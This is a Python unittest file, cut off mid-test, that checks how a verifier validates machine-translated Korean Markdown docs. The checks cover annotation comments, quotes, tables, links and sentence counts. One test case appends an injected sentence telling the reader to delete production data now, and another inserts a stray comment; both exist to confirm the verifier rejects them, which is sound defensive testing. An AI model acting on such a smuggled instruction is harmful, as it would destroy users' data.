"""provider 응답의 구조·주석·언어 계약 검증."""

import unittest

from sync import response_contract


class VerifyProviderResponseTests(unittest.TestCase):
    """provider 응답의 구조·주석·보호 데이터 계약 테스트 모음."""

    @staticmethod
    def _with_table_owner_annotation(source: str, translated: str) -> str:
        """표의 전체 원문을 canonical 소유 주석으로 앞에 붙인 응답 생성."""

        return f"<!-- {' '.join(source.split())} -->\n{translated}"

    def test_identity_annotations_do_not_split_one_list_block(self):
        """identity 주석이 하나의 목록 블록을 분할하지 않도록 제한."""

        source = "- `::1`\n- `APP_URL` in `.env`\n"

        rendered = response_contract.render_identity_response(source, "13.x")

        self.assertEqual(
            response_contract.verify(rendered, source),
            [],
        )

    def test_identity_annotations_do_not_split_blankless_reference_prose(self):
        """빈 줄 없는 reference 산문을 identity 주석으로 분할하지 않음."""

        source = "Prose.\n[x]: /x\nMore prose.\n"

        rendered = response_contract.render_identity_response(source, "13.x")

        self.assertEqual(
            response_contract.verify(rendered, source),
            [],
        )

    def test_rejects_indented_generated_comment(self):
        """들여쓴 provider 생성 주석 거부."""

        source = "Acquire the lock.\n"
        translated = """    <!-- Acquire the lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_inline_generated_annotation(self):
        """문장 안에 삽입된 provider annotation 거부."""

        source = "First source line.  \nSecond source line.\n"
        translated = (
            "원문에 없는 추가 설명입니다. "
            "<!-- First source line. Second source line. -->  \n"
            "정상 번역입니다.\n"
        )

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_extra_empty_comment(self):
        """원문에 없는 빈 HTML 주석 거부."""

        source = "Acquire the lock.\n"
        translated = """<!-- -->
<!-- Acquire the lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_preserved_empty_source_comment(self):
        """원문에 있던 빈 HTML 주석 보존 허용."""

        source = """<!-- -->

Acquire the lock.
"""
        translated = """<!-- -->

<!-- Acquire the lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_inline_source_comment_moved_outside_its_paragraph(self):
        """inline 원문 주석을 소유 문단 밖으로 이동한 응답 거부."""

        source = "Before <!-- keep --> after.\n"
        translated = """<!-- Before <!-- keep --&gt; after. -->
이전과 이후입니다.
<!-- keep -->
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_inline_source_comment_moved_to_another_hard_break_line(self):
        """inline 원문 주석을 다른 hard break 줄로 이동한 응답 거부."""

        source = "Before <!-- keep --> after.  \nSecond source line.\n"
        translated = (
            "<!-- Before <!-- keep --&gt; after. Second source line. -->\n"
            "첫 번째 번역 줄입니다." + "  \n"
            "두 번째 <!-- keep --> 번역 줄입니다.\n"
        )

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_source_comment_removed_from_blockquote(self):
        """인용문에서 원문 작성 주석을 제거한 응답 거부."""

        source = """> <!-- keep -->
> Guidance.
"""
        translated = """<!-- keep -->
> 안내입니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_malformed_html_comment_delimiters(self):
        """짝이 맞지 않는 HTML 주석 구분자 거부."""

        source = "Acquire the lock.\n"
        variants = (
            "<!-- Acquire the lock. -->\n캐시 잠금을 획득합니다. <!--\n",
            "<!-- Acquire the lock. -->\n캐시 잠금을 획득합니다. -->\n",
            (
                "<!-- Acquire the lock. -->\n"
                "캐시 잠금을 획득합니다. <!-- outer <!-- inner -->\n"
            ),
        )

        for translated in variants:
            with self.subTest(translated=translated):
                self.assertIn(
                    "provider malformed HTML comment",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_ignores_comment_delimiters_inside_fenced_code(self):
        """fenced code 안의 HTML 주석 구분자를 구조 검사에서 제외."""

        source = """```text
<!--
-->
```
"""

        self.assertNotIn(
            "provider malformed HTML comment",
            response_contract.verify(source, source),
        )

    def test_ignores_comment_delimiters_inside_inline_code(self):
        """inline code 안의 HTML 주석 구분자를 구조 검사에서 제외."""

        cases = (
            (
                "Use `<!--` literally.\n",
                "<!-- Use `<!--` literally. -->\n"
                "`<!--`를 그대로 사용합니다.\n",
            ),
            (
                "Use `<!--` and `-->` as literal delimiters.\n",
                "<!-- Use `<!--` and `--&gt;` as literal delimiters. -->\n"
                "`<!--`와 `-->`를 리터럴 구분자로 사용합니다.\n",
            ),
        )
        for source, translated in cases:
            with self.subTest(source=source):
                self.assertNotIn(
                    "provider malformed HTML comment",
                    response_contract.verify(
                        translated,
                        source,
                        locale="ko",
                    ),
                )

    def test_accepts_adjacent_legacy_structural_annotations(self):
        """서로 인접한 기존 구조 주석 보존 허용."""

        cases = (
            ("<div>\n", "<!-- <div> -->\n<div>\n"),
            (
                "- [Guide](#guide)\n",
                "<!-- - [Guide](#guide) -->\n- [Guide](#guide)\n",
            ),
            (
                '<a name="guide"></a>\n',
                '<!-- <a name="guide"></a> -->\n<a name="guide"></a>\n',
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertEqual(
                    response_contract.verify(translated, source, locale="ko"),
                    [],
                )

    def test_rejects_relocated_legacy_structural_annotations(self):
        """기존 구조 주석의 위치 이동 거부."""

        cases = (
            ("<div>\n", "<div>\n<!-- <div> -->\n"),
            (
                "- [Guide](#guide)\n",
                "- [Guide](#guide)\n<!-- - [Guide](#guide) -->\n",
            ),
            (
                '<a name="guide"></a>\n',
                '<a name="guide"></a>\n<!-- <a name="guide"></a> -->\n',
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertIn(
                    "provider source comment mismatch",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_accepts_owned_optional_quote_annotation(self):
        """대응 인용 블록을 소유하는 선택적 주석 허용."""

        source = "> Quoted guidance.\n"
        translated = """> <!-- Quoted guidance. -->
> 인용 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_optional_quote_after_blockquoted_fence(self):
        """인용된 code fence 다음 선택적 인용 주석 허용."""

        source = (
            "> ```text\n"
            "> literal\n"
            "> ```\n\n"
            "> Quoted guidance.\n"
        )
        translated = (
            "> ```text\n"
            "> literal\n"
            "> ```\n\n"
            "> <!-- Quoted guidance. -->\n"
            "> 인용 안내입니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_optional_quote_after_source_authored_quote_comment(self):
        """원문 작성 인용 주석 다음 선택적 annotation 허용."""

        source = """> <!-- keep -->
> Guidance.
"""
        translated = """> <!-- keep -->
> <!-- Guidance. -->
> 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_moved_optional_quote_after_source_authored_comment(self):
        """원문 작성 주석에서 분리된 선택적 인용 annotation 거부."""

        source = """> <!-- keep -->
> First guidance.

> Second guidance.
"""
        translated = """> <!-- keep -->
> 첫 번째 안내입니다.

> <!-- First guidance. -->
> 두 번째 안내입니다.
"""

        self.assertIn(
            "provider original comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_orphaned_optional_quote_annotation(self):
        """소유할 인용 블록이 없는 선택적 annotation 거부."""

        source = "> Quoted guidance.\n"
        translated = """> 인용 안내입니다.
> <!-- Quoted guidance. -->
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_optional_quote_annotation_at_wrong_depth(self):
        """인용 깊이가 다른 선택적 annotation 거부."""

        source = "> Quoted guidance.\n"
        translated = """> > <!-- Quoted guidance. -->
> 인용 안내입니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_optional_quote_annotation_on_a_later_quote(self):
        """뒤쪽 인용 블록으로 이동한 선택적 annotation 거부."""

        source = """> First guidance.

> Second guidance.
"""
        translated = """> 첫 번째 안내입니다.

> <!-- First guidance. -->
> 두 번째 안내입니다.
"""

        self.assertIn(
            "provider original comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_moved_structural_quote_annotation(self):
        """구조적 인용 annotation의 위치 이동 거부."""

        source = """> First guidance.
> Second guidance.
"""
        translated = """> 첫 번째 안내입니다.
<!-- > First guidance. -->
> 두 번째 안내입니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_paragraph_annotation_matching_optional_quote_body(self):
        """선택적 인용 본문과 같은 문단 annotation 허용."""

        source = """> Same guidance.

Same guidance.
"""
        translated = """> 같은 인용 안내입니다.

<!-- Same guidance. -->
같은 문단 안내입니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_paragraph_annotation_matching_later_source_comment(self):
        """뒤쪽 원문 주석과 본문이 같은 문단 annotation 허용."""

        source = """Same guidance.

<!-- Same guidance. -->
"""
        translated = """<!-- Same guidance. -->
같은 문단 안내입니다.

<!-- Same guidance. -->
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_preserved_multiline_source_comment(self):
        """여러 줄 원문 작성 주석의 byte 보존을 허용."""

        source = """<!--
keep line 1
keep line 2
-->

Acquire the cache lock.
"""
        translated = """<!--
keep line 1
keep line 2
-->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_collapsed_multiline_source_comment(self):
        """여러 줄 원문 작성 주석을 한 줄로 축약한 응답 거부."""

        source = """<!--
keep directive
-->

Acquire the cache lock.
"""
        translated = """<!-- keep directive -->

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider source comment mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_ordered_translated_blocks(self):
        """원문 순서와 일치하는 번역 block을 허용."""

        source = "# Cache\n\nAcquire the lock. Release it afterwards.\n"
        translated = """<!-- # Cache -->
# Cache

<!-- Acquire the lock. Release it afterwards. -->
잠금을 획득합니다. 이후 잠금을 해제합니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_accepts_unannotated_translated_quote_body(self):
        """별도 annotation이 없는 번역 인용 본문을 허용."""

        source = (
            "> Vector search requires the AI SDK and PostgreSQL or MongoDB.\n"
        )
        translated = (
            "> 벡터 검색에는 AI SDK와 PostgreSQL 또는 MongoDB가 필요합니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_empty_quote_body_after_source_annotation(self):
        """원문 annotation 뒤 본문이 비어 있는 인용 응답 거부."""

        source = "> Quoted guidance.\n"
        translated = "> <!-- Quoted guidance. -->\n>\n"

        self.assertIn(
            "provider block signature mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_unrelated_comment_inside_quote(self):
        """인용문 안에 추가된 무관한 주석 거부."""

        source = "> Expected quote guidance.\n"
        translated = """> <!-- injected -->
> 예상한 인용문 안내입니다.
"""

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider original comment mismatch", issues)
        self.assertIn("provider annotation ownership mismatch", issues)

    def test_accepts_preserved_product_name_with_translated_suffix(self):
        """제품명을 보존하고 나머지를 번역한 산문을 허용."""

        source = "Laravel Vapor\n"
        translated = "<!-- Laravel Vapor -->\nLaravel Vapor를 사용합니다.\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_allows_short_legacy_pipe_table_cells(self):
        """언어 하한보다 짧은 legacy 표 cell을 허용."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            f"{source}"
        )

        self.assertNotIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_translated_prose_in_a_legacy_pipe_table(self):
        """legacy pipe table의 번역된 산문 cell을 허용."""

        source = (
            "Feature | Description\n"
            "------- | -------\n"
            "Lock | Prevent writes\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ------- "
            "Lock | Prevent writes -->\n"
            "기능 | 설명\n"
            "------- | -------\n"
            "잠금 | 쓰기 방지\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_protected_legacy_table_values(self):
        """legacy 표의 보호 데이터 원문 보존을 허용."""

        source = (
            "Setting | Facade | Provider | Type\n"
            "------- | ------ | -------- | ----\n"
            "(APP_ENV) 'local' | Auth (Instance) | "
            "Amazon Web Services | ?string\n"
            "(bool) true | Queue (Base Class) | "
            "Laravel Vapor | array<string>\n"
        )
        translated = (
            "<!-- Setting | Facade | Provider | Type "
            "------- | ------ | -------- | ---- "
            "(APP_ENV) 'local' | Auth (Instance) | "
            "Amazon Web Services | ?string "
            "(bool) true | Queue (Base Class) | "
            "Laravel Vapor | array<string> -->\n"
            "설정 | 파사드 | 제공자 | 타입\n"
            "------- | ------ | -------- | ----\n"
            "(APP_ENV) 'local' | Auth (Instance) | "
            "Amazon Web Services | ?string\n"
            "(bool) true | Queue (Base Class) | "
            "Laravel Vapor | array<string>\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_allows_short_unchanged_legacy_table_prose(self):
        """짧아서 그대로 남은 legacy 표 산문을 허용."""

        source = (
            "Color | Description\n"
            "----- | -----------\n"
            "Red | Indicates danger\n"
        )
        translated = (
            "<!-- Color | Description ----- | ----------- "
            "Red | Indicates danger -->\n"
            "색상 | 설명\n"
            "----- | -----------\n"
            "Red | 위험을 나타냅니다\n"
        )

        issues = response_contract.verify(
            translated,
            source,
            locale="ko",
        )

        self.assertNotIn("provider target language mismatch", issues)


    def test_rejects_changed_single_word_legacy_table_identifier(self):
        """legacy 표의 단일 단어 식별자 변경 거부."""

        source = (
            "Feature | Description\n"
            "------- | -----------\n"
            "API | Request layer\n"
        )
        translated = (
            "<!-- Feature | Description ------- | ----------- "
            "API | Request layer -->\n"
            "기능 | 설명\n"
            "SDK | 요청 계층\n"
        )

        self.assertIn(
            "provider protected term mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_preserved_indented_command(self):
        """들여쓴 명령의 원문 보존을 허용."""

        source = "    vagrant destroy\n"
        translated = (
            "<!--     vagrant destroy -->\n"
            "    vagrant destroy\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_short_environment_assignment(self):
        """짧은 환경 변수 대입식의 원문 보존을 허용."""

        source_body = "PADDLE_SANDBOX=true"
        translated = f"<!-- {source_body} -->\n{source_body}\n"

        self.assertEqual(
            response_contract.verify(
                translated,
                source_body + "\n",
                locale="ko",
            ),
            [],
        )

    def test_accepts_translated_identifier_only_legacy_pipe_table(self):
        """식별자 cell만 있는 legacy 표의 구조 보존을 허용."""

        source = (
            "Facade | Class\n"
            "------- | -------\n"
            "App | `Application`\n"
        )
        translated = (
            "<!-- Facade | Class ------- | ------- App | `Application` -->\n"
            "파사드 | 클래스\n"
            "------- | -------\n"
            "App | `Application`\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_preserved_inline_code_only_paragraph(self):
        """inline code만 있는 문단의 원문 보존을 허용."""

        source = "`Illuminate\\Database\\Grammar`\n"
        translated = (
            "<!-- `Illuminate\\Database\\Grammar` -->\n"
            "`Illuminate\\Database\\Grammar`\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_unannotated_inline_code_only_identifier_list(self):
        """annotation이 없는 inline code 식별자 목록을 허용."""

        source = "- `data`\n- `render`\n- `resolve`\n- `shouldRender`\n"

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )

    def test_accepts_inline_source_comment_after_soft_wrap_folding(self):
        """soft wrap 축약 뒤에도 inline 원문 주석의 위치 보존을 허용."""

        source = "First physical line\nsecond <!-- keep --> line.\n"
        translated = (
            "<!-- First physical line second <!-- keep --&gt; line. -->\n"
            "첫 번째와 두 번째 <!-- keep --> 줄입니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_multi_backtick_inline_code_only_identifier_list(self):
        """여러 backtick 구분자를 사용한 식별자 목록을 허용."""

        source = "- ``data`value``\n- ``render`value``\n"

        self.assertEqual(
            response_contract.verify(source, source, locale="ko"),
            [],
        )

    def test_rejects_changed_inline_code_only_identifier_list(self):
        """inline code 식별자 목록의 값 변경 거부."""

        source = "- `data`\n- `render`\n"
        translated = "- `data`\n- `changed`\n"

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider inline code mismatch", "provider protected term mismatch"],
        )

    def test_accepts_product_heavy_translation(self):
        """제품명이 많은 산문에서 번역된 나머지 내용을 허용."""

        source = "**Supported providers:** Anthropic, Gemini\n"
        translated = (
            "<!-- **Supported providers:** Anthropic, Gemini -->\n"
            "**지원 제공자:** Anthropic, Gemini\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_mostly_untranslated_prose_with_target_suffix(self):
        """대상 언어 접미사만 붙인 대부분 미번역 산문 거부."""

        source = (
            "Acquire the cache lock before updating the stored application value.\n"
        )
        translated = (
            "<!-- Acquire the cache lock before updating the stored application "
            "value. -->\n"
            "Acquire the cache lock before updating the stored application "
            "값입니다.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider target language mismatch"],
        )

    def test_rejects_comment_without_owned_body(self):
        """소유 본문이 없는 annotation 응답 거부."""

        source = "Acquire the lock.\n"
        translated = "<!-- Acquire the lock. -->\n"

        self.assertEqual(
            response_contract.verify(translated, source),
            [
                "provider block signature mismatch",
                "provider annotation ownership mismatch",
            ],
        )

    def test_rejects_annotations_grouped_away_from_their_bodies(self):
        """본문과 떨어진 위치에 몰아둔 annotation 거부."""

        source = "First paragraph.\n\nSecond paragraph.\n"
        translated = """<!-- First paragraph. -->
<!-- Second paragraph. -->
첫 번째 문단입니다.

두 번째 문단입니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_annotation_separated_from_body_by_code(self):
        """code 블록으로 소유 본문과 분리된 annotation 거부."""

        source = """```php
Cache::lock('foo');
```

Acquire the cache lock.
"""
        translated = """<!-- Acquire the cache lock. -->
```php
Cache::lock('foo');
```

캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_annotation_moved_to_nonannotatable_list_item(self):
        """주석 대상이 아닌 목록 항목으로 이동한 annotation 거부."""

        source = "Paragraph guidance.\n\n- `foo`\n"
        translated = (
            "번역된 안내입니다.\n\n"
            "<!-- Paragraph guidance. -->\n"
            "- `foo`\n"
        )

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_annotation_owned_by_the_wrong_block_kind(self):
        """원문과 다른 블록 유형을 소유하는 annotation 거부."""

        source = "Paragraph guidance.\n\n- Translate this item.\n"
        translated = (
            "번역된 안내입니다.\n\n"
            "<!-- Paragraph guidance. -->\n"
            "- 번역된 항목입니다.\n\n"
            "<!-- - Translate this item. -->\n"
            "뒤늦은 문단입니다.\n"
        )

        self.assertIn(
            "provider annotation ownership mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_allows_exact_source_echo_without_live_locale_profile(self):
        """live locale 검사가 없는 replay에서 원문 동일 응답을 허용."""

        source = "Acquire the cache lock before updating the value.\n"
        translated = """<!-- Acquire the cache lock before updating the value. -->
Acquire the cache lock before updating the value.
"""

        self.assertEqual(
            response_contract.verify(translated, source),
            [],
        )

    def test_rejects_changed_markdown_link_before_patch(self):
        """patch 전에 변경된 Markdown 링크 label이나 target 거부."""

        source = "Read the [cache guide](cache.md) before continuing.\n"
        translated = (
            "<!-- Read the [cache guide](cache.md) before continuing. -->\n"
            "계속하기 전에 [다른 안내](other.md)를 읽으세요.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [
                "provider link target mismatch",
                "provider link label mismatch",
                "provider link pair mismatch",
            ],
        )

    def test_rejects_commonmark_link_forms_that_change_source_owned_data(self):
        """원문 소유 데이터를 바꾼 CommonMark 링크 형태 거부."""

        cases = (
            (
                "Visit <https://example.com/a>.\n",
                "<!-- Visit <https://example.com/a>. -->\n"
                "<https://example.com/b>를 방문합니다.\n",
                "provider link target mismatch",
            ),
            (
                "Contact <user@example.com>.\n",
                "<!-- Contact <user@example.com>. -->\n"
                "<other@example.com>으로 문의합니다.\n",
                "provider link target mismatch",
            ),
            (
                "Use [Cache]() here.\n",
                "<!-- Use [Cache]() here. -->\n"
                "여기에서 [캐시]()를 사용합니다.\n",
                "provider link label mismatch",
            ),
            (
                "See [Docs](<https://example.com/a b>).\n",
                "<!-- See [Docs](<https://example.com/a b>). -->\n"
                "[Docs](<https://example.com/c d>)를 참고합니다.\n",
                "provider link target mismatch",
            ),
        )

        for source, translated, provider_issue in cases:
            with self.subTest(source=source):
                self.assertIn(
                    provider_issue,
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_rejects_changed_markdown_link_title_before_patch(self):
        """patch 전에 변경된 Markdown 링크 title 거부."""

        source = 'Read the [cache guide](cache.md "Cache guide").\n'
        translated = (
            '<!-- Read the [cache guide](cache.md "Cache guide"). -->\n'
            '[cache guide](cache.md "캐시 안내")를 읽으세요.\n'
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            ["provider link title mismatch"],
        )

    def test_accepts_translated_image_alt_with_ordered_target_and_title(self):
        """target과 title 순서를 보존한 image alt 번역을 허용."""

        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        translated = (
            '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
            '고양이 이미지를 표시합니다: ![고양이](cat.png "Cat title").\n\n'
            '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
            '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
        )

        self.assertEqual(
            [],
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_markdown_image_target_and_title_drift_before_patch(self):
        """patch 전 Markdown 이미지 target·title 변경 거부."""

        source = (
            'Show the cat image: ![Cat](cat.png "Cat title").\n\n'
            'Show the dog image: ![Dog](dog.png "Dog title").\n'
        )
        cases = (
            (
                "swapped targets",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](dog.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](cat.png "Dog title").\n'
                ),
                "provider link target mismatch",
            ),
            (
                "missing image",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Cat title").\n'
                ),
                "provider link target mismatch",
            ),
            (
                "changed target",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](wrong.png "Cat title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "provider link target mismatch",
            ),
            (
                "swapped titles",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Dog title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Cat title").\n'
                ),
                "provider link title mismatch",
            ),
            (
                "changed title",
                (
                    '<!-- Show the cat image: ![Cat](cat.png "Cat title"). -->\n'
                    '고양이 이미지를 표시합니다: '
                    '![고양이](cat.png "Wrong title").\n\n'
                    '<!-- Show the dog image: ![Dog](dog.png "Dog title"). -->\n'
                    '개 이미지를 표시합니다: ![개](dog.png "Dog title").\n'
                ),
                "provider link title mismatch",
            ),
        )

        for name, translated, expected_issue in cases:
            with self.subTest(name=name):
                self.assertIn(
                    expected_issue,
                    response_contract.verify(
                        translated,
                        source,
                        locale="ko",
                    ),
                )

    def test_accepts_normalized_reference_definition_label_before_patch(self):
        """patch 전에 동등하게 정규화되는 reference label을 허용."""

        source = '[Cache \t DOC]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache doc]: /docs/13.x/cache "Cache docs"\n'

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertEqual(issues, [])

    def test_rejects_reference_definition_version_drift_before_patch(self):
        """patch 전 reference 정의의 버전 target 변경 거부."""

        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[CACHE-DOC]: /docs/12.x/cache "Cache docs"\n'

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider link target mismatch", issues)
        self.assertIn("provider link pair mismatch", issues)
        self.assertNotIn("provider link label mismatch", issues)

    def test_rejects_reference_definition_title_drift_before_patch(self):
        """patch 전 reference 정의의 title 변경 거부."""

        source = '[cache-doc]: /docs/13.x/cache "Cache docs"\n'
        translated = '[cache-doc]: /docs/13.x/cache "다른 제목"\n'

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider link title mismatch", issues)
        self.assertNotIn("provider link target mismatch", issues)
        self.assertNotIn("provider link label mismatch", issues)
        self.assertNotIn("provider link pair mismatch", issues)

    def test_rejects_missing_duplicate_reference_definition_before_patch(self):
        """patch 전 중복 reference 정의 occurrence 누락 거부."""

        definition = '[cache-doc]: /docs/13.x/cache "Cache docs"'
        source = f"{definition}\n\n{definition}\n"
        translated = f"{definition}\n"

        issues = response_contract.verify(translated, source, locale="ko")

        self.assertIn("provider link target mismatch", issues)
        self.assertIn("provider link label mismatch", issues)
        self.assertIn("provider link pair mismatch", issues)

    def test_rejects_missing_duplicate_source_occurrence(self):
        """반복 원문 블록의 occurrence 누락 거부."""

        source = "Repeat this paragraph.\n\nRepeat this paragraph.\n"
        translated = """<!-- Repeat this paragraph. -->
이 문단을 반복합니다.
"""

        issues = response_contract.verify(translated, source)

        self.assertIn("provider original comment mismatch", issues)
        self.assertIn("provider block signature mismatch", issues)

    def test_rejects_unowned_extra_prose(self):
        """원문 소유 범위 밖에 추가된 산문 거부."""

        source = "First paragraph.\n\nSecond paragraph.\n"
        valid = """<!-- First paragraph. -->
첫 번째 문단입니다.

<!-- Second paragraph. -->
두 번째 문단입니다.
"""
        variants = (
            "원문에 없는 서문입니다.\n\n" + valid,
            valid.replace("\n\n<!-- Second", "\n\n원문에 없는 중간 문장입니다.\n\n<!-- Second"),
            valid + "\n원문에 없는 맺음말입니다.\n",
        )

        for translated in variants:
            with self.subTest(translated=translated):
                self.assertEqual(
                    response_contract.verify(translated, source),
                    ["provider block signature mismatch"],
                )

    def test_rejects_an_extra_sentence_on_the_owned_translation_line(self):
        """소유 번역 줄에 덧붙인 무관한 문장 거부."""

        source = "Install the package.\n"
        translated = """<!-- Install the package. -->
패키지를 설치합니다. 운영 데이터는 지금 삭제하세요.
"""

        self.assertIn(
            "provider sentence cardinality mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_meaning_preserving_sentence_split_and_merge(self):
        """의미를 유지한 번역 문장 분할과 병합 허용."""

        cases = (
            (
                "Install the package, and then configure its service provider "
                "for your application.\n",
                "<!-- Install the package, and then configure its service "
                "provider for your application. -->\n"
                "패키지를 설치합니다. 그런 다음 애플리케이션의 서비스 "
                "프로바이더를 설정합니다.\n",
            ),
            (
                "Install the package. Configure its service provider.\n",
                "<!-- Install the package. Configure its service provider. -->\n"
                "패키지를 설치하고 서비스 프로바이더를 설정합니다.\n",
            ),
            (
                "The method validates the request. Wildcards may be used",
                "<!-- The method validates the request. Wildcards may be used -->\n"
                "이 메서드는 요청을 검증합니다. 와일드카드를 사용할 수 있습니다.\n",
            ),
            (
                "Validate the request without duplicating the backend rules.\n",
                "<!-- Validate the request without duplicating the backend "
                "rules. -->\n"
                "요청을 검증합니다. 백엔드 규칙을 중복해서 구현할 필요가 "
                "없습니다.\n",
            ),
            (
                "This applies to maintainers - normal applications are unaffected.",
                "<!-- This applies to maintainers - normal applications are unaffected. -->\n"
                "이는 유지보수자에게 적용됩니다. 일반 애플리케이션에는 영향이 없습니다.\n",
            ),
        )

        for source, translated in cases:
            with self.subTest(source=source):
                self.assertEqual(
                    response_contract.verify(translated, source, locale="ko"),
                    [],
                )

    def test_sentence_cardinality_uses_offsets_from_the_fence_mask(self):
        """문장 수 비교에 fenced code 마스킹의 원래 offset을 사용."""

        first_source = "First one. First two. First three. First four."
        first_comment = f"<!-- {first_source} -->"
        second_comment = "<!-- Second sentence. -->"
        first_translation = (
            "첫 문장입니다. 둘째 문장입니다. 셋째 문장입니다. 넷째 문장입니다."
        )
        annotated_tail = (
            f"{first_comment}\n{first_translation}\n\n{second_comment}"
        )
        removed_line_length = len(annotated_tail) - len(first_comment)
        code_payload = "x" * (removed_line_length - 1)
        source = (
            f"```text\n{code_payload}\n```\n\n"
